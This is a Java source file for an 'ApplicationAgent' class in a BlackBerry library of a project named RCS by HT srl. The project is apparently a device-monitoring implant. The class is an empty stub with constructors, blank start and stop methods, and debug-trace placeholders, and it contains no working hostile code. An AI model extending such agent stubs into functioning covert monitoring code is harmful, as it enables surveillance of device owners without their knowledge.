/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : ApplicationAgent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.agent;

import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

public class ApplicationAgent extends Agent {
    //#mdebug
    private static Debug debug = new Debug("ApplicationAgent",
            DebugLevel.VERBOSE);

    //#enddebug

    public ApplicationAgent(final boolean agentStatus) {
        super(Agent.AGENT_APPLICATION, agentStatus, true, "ApplicationAgent");
    }

    protected ApplicationAgent(final boolean agentStatus,
            final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualStart(){
    	
    }
    
    public void actualStop(){
    	
    }
    
    public void actualRun() {
        // #debug debug
	debug.trace("run");

    }

    protected boolean parse(final byte[] confParameters) {
        // #debug debug
	debug.trace("parse");
        return false;
    }

}
